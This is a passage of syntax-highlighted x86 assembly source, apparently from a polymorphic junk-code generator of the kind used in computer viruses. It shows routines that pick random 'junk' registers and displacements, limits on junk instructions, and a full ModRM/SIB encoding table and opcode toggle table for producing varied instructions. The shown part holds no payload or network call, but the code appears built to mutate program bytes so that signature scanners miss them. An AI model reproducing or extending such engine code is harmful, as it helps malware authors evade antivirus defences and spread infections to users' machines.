                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk_proc7</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_jreg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                           </span><span class="sc1">; choose one random junk</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">; register out of the 3</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; available</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_0</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jreg1</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_0</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_1</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jreg2</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_1</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jreg3</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_jreg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_random_disp</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">; choose random displacements</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random32</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; 32bit</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random32</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; 16bit</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random32</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; 8bit</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_random_disp</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maxjunks</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">max_junk_hunk</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">row</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">ModRM</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc1">; The Intel(C) instruction set comes in the following mode:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Prefixes, Opcode, Mod/RM, SIB, immediate</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The Mod/RM and SIB bytes are defined in the following table:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÕÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¸</span><span class="sc0">
</span><span class="sc1">;³ MOD/RM AND SIB BYTE VALUES FOR ALL ADDRESSING MODES USED                 ³</span><span class="sc0">
</span><span class="sc1">;ÆÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ</span><span class="sc0">
</span><span class="sc1">;³ AL   CL   DL   BL   AH   CH   DH   BH    ³ 8BIT REGISTER                 ³</span><span class="sc0">
</span><span class="sc1">;³ AX   CX   DX   BX   SP   BP   SI   DI    ³ 16BIT REGISTER                ³</span><span class="sc0">
</span><span class="sc1">;³ EAX  ECX  EDX  EBX  ESP  EBP  ESI  EDI   ³ 32BIT REGISTER                ³</span><span class="sc0">
</span><span class="sc1">;³ 0    1    2    3    4    5    6    7     ³ ORDER                         ³</span><span class="sc0">
</span><span class="sc1">;³ 000  001  010  011  100  101  110  111   ÆÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍµ</span><span class="sc0">
</span><span class="sc1">;³ MOD/RM VALUE: (MOD = 00)                 ³16BIT ADDR ³32BIT AD.³SCALE    ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">038h</span><span class="sc0"> </span><span class="sc1">;³[BX+SI]    ³[EAX]    ³[EAX]    ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc0"> </span><span class="sc1">;³[BX+DI]    ³[ECX]    ³[ECX]    ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc2">01Ah</span><span class="sc4">,</span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc2">03Ah</span><span class="sc0"> </span><span class="sc1">;³[BP+SI]    ³[EDX]    ³[EDX]    ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc2">013h</span><span class="sc4">,</span><span class="sc2">01Bh</span><span class="sc4">,</span><span class="sc2">023h</span><span class="sc4">,</span><span class="sc2">02Bh</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">03Bh</span><span class="sc0"> </span><span class="sc1">;³[BP+DI]    ³[EBX]    ³[ECX]    ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc2">01Ch</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc2">02Ch</span><span class="sc4">,</span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc2">03Ch</span><span class="sc0"> </span><span class="sc1">;³[SI]       ³[--]     ³NONE     ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc2">02Dh</span><span class="sc4">,</span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc2">03Dh</span><span class="sc0"> </span><span class="sc1">;³[DI]       ³D32      ³[EBP]    ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">01Eh</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">036h</span><span class="sc4">,</span><span class="sc2">03Eh</span><span class="sc0"> </span><span class="sc1">;³D16        ³[ESI]    ³[ESI]    ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc2">02Fh</span><span class="sc4">,</span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc2">03Fh</span><span class="sc0"> </span><span class="sc1">;³[BX]       ³[EDI]    ³[EDI]    ³</span><span class="sc0">
</span><span class="sc1">; MOD/RM VALUE: (MOD = 01)                  ³           ³         ³         ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">078h</span><span class="sc0"> </span><span class="sc1">;³[BX+SI+D8] ³[EAX+D8] ³[EAX*2]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">071h</span><span class="sc4">,</span><span class="sc2">079h</span><span class="sc0"> </span><span class="sc1">;³[BX+DI+D8] ³[ECX+D8] ³[ECX*2]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc2">04Ah</span><span class="sc4">,</span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">06Ah</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">07Ah</span><span class="sc0"> </span><span class="sc1">;³[BP+SI+D8] ³[EDX+D8] ³[EDX*2]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc2">06Bh</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">07Bh</span><span class="sc0"> </span><span class="sc1">;³[BP+DI+D8] ³[EBX+D8] ³[EBX*2]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">05Ch</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">07Ch</span><span class="sc0"> </span><span class="sc1">;³[SI+D8]    ³[--+D8]  ³NONE     ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">04Dh</span><span class="sc4">,</span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">07Dh</span><span class="sc0"> </span><span class="sc1">;³[DI+D8]    ³[EBP+D8] ³[EBP*2]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc2">056h</span><span class="sc4">,</span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc2">07Eh</span><span class="sc0"> </span><span class="sc1">;³[BP+D8]    ³[ESI+D8] ³[ESI*2]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc2">05Fh</span><span class="sc4">,</span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc2">07Fh</span><span class="sc0"> </span><span class="sc1">;³[BX+D8]    ³[EDI+D8] ³[EDI*2]  ³</span><span class="sc0">
</span><span class="sc1">; MOD/RM VALUE (MOD = 10)                   ³           ³         ³         ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">;³[BX+SI+D16]³[EAX+D32]³[EAX*4]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc4">,</span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc0"> </span><span class="sc1">;³[BX+DI+D16]³[ECX+D32]³[ECX*4]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">08Ah</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc2">09Ah</span><span class="sc4">,</span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc2">0B2h</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc0"> </span><span class="sc1">;³[BP+SI+D16]³[EDX+D32]³[EDX*4]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc2">09Bh</span><span class="sc4">,</span><span class="sc2">0A3h</span><span class="sc4">,</span><span class="sc2">0ABh</span><span class="sc4">,</span><span class="sc2">0B3h</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc0"> </span><span class="sc1">;³[BP+DI+D16]³[EBX+D32]³[EBX*4]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc2">08Ch</span><span class="sc4">,</span><span class="sc2">094h</span><span class="sc4">,</span><span class="sc2">09Ch</span><span class="sc4">,</span><span class="sc2">0A4h</span><span class="sc4">,</span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">0BCh</span><span class="sc0"> </span><span class="sc1">;³[SI+D16]   ³[--+D32] ³NONE     ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">085h</span><span class="sc4">,</span><span class="sc2">08Dh</span><span class="sc4">,</span><span class="sc2">095h</span><span class="sc4">,</span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc2">0BDh</span><span class="sc0"> </span><span class="sc1">;³[DI+D16]   ³[EBP+D32]³[EBP*4]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc2">096h</span><span class="sc4">,</span><span class="sc2">09Eh</span><span class="sc4">,</span><span class="sc2">0A6h</span><span class="sc4">,</span><span class="sc2">0AEh</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc0"> </span><span class="sc1">;³[BP+D16]   ³[ESI+D32]³[ESI*4]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc2">08Fh</span><span class="sc4">,</span><span class="sc2">097h</span><span class="sc4">,</span><span class="sc2">09Fh</span><span class="sc4">,</span><span class="sc2">0A7h</span><span class="sc4">,</span><span class="sc2">0AFh</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0"> </span><span class="sc1">;³[BX+D16]   ³[EDI+D32]³[EDI*4]  ³</span><span class="sc0">
</span><span class="sc1">; MOD/RM VALUE (MOD = 11)                   ³           ³         ³         ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0"> </span><span class="sc1">;³EAX/AX/AL  ³EAX/AX/AL³[EAX*8]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">0C9h</span><span class="sc4">,</span><span class="sc2">0D1h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0"> </span><span class="sc1">;³ECX/CX/CL  ³ECX/CX/CL³[ECX*8]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C2h</span><span class="sc4">,</span><span class="sc2">0CAh</span><span class="sc4">,</span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc0"> </span><span class="sc1">;³EDX/DX/DL  ³EDX/DX/DL³[EDX*8]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc2">0CBh</span><span class="sc4">,</span><span class="sc2">0D3h</span><span class="sc4">,</span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc2">0E3h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc0"> </span><span class="sc1">;³EBX/BX/BL  ³EBX/BX/BL³[EBX*8]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc2">0D4h</span><span class="sc4">,</span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0"> </span><span class="sc1">;³ESP/SP/AH  ³ESP/SP/AH³NONE     ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C5h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc2">0F5h</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc0"> </span><span class="sc1">;³EBP/BP/CH  ³EBP/BP/CH³[EBP*8]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc2">0CEh</span><span class="sc4">,</span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc2">0DEh</span><span class="sc4">,</span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0"> </span><span class="sc1">;³ESI/SI/DH  ³ESI/SI/DH³[ESI*8]  ³</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc2">0CFh</span><span class="sc4">,</span><span class="sc2">0D7h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">0E7h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">;³EDI/DI/BH  ³EDI/DI/BH³[EDI*8]  ³</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc1">; The prefixes:</span><span class="sc0">
</span><span class="sc5">Operand_size_toggle</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">   </span><span class="sc1">; changes between 16bit and 32bit operands</span><span class="sc0">
</span><span class="sc5">Address_size_toggle</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">67h</span><span class="sc0">   </span><span class="sc1">; changes between 16bit and 32bit addressing</span><span class="sc0">

</span><span class="sc1">; The toggle bytes (applied by XORing the OpCode with them):</span><span class="sc0">
</span><span class="sc5">Direction_toggle</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">   </span><span class="sc1">; toggles operand-&gt;address and address-&gt;op.</span><span class="sc0">
</span><span class="sc5">Size_toggle</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">; toggles between 8bit and 16bit operators</span><span class="sc0">

</span><span class="sc1">; The immediate values used:</span><span class="sc0">
</span><span class="sc5">disp8</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; 8bit displacement</span><span class="sc0">
</span><span class="sc5">disp16</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; 16bit displacement</span><span class="sc0">
</span><span class="sc5">disp32</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; 32bit displacement</span><span class="sc0">

</span><span class="sc1">; Reg to/from Address: (second byte 0=only junk register / 1=any register)</span><span class="sc0">

</span><span class="sc5">Table1</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; ADD            Explanation:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; OR                - unchaged = 8bit addr  -&gt; 8bit reg</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; ADC               - +1       = 16bit addr -&gt; 16bit reg</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; SBB               - +2       = 8bit reg   -&gt; 8bit addr</span><span class="sc0">
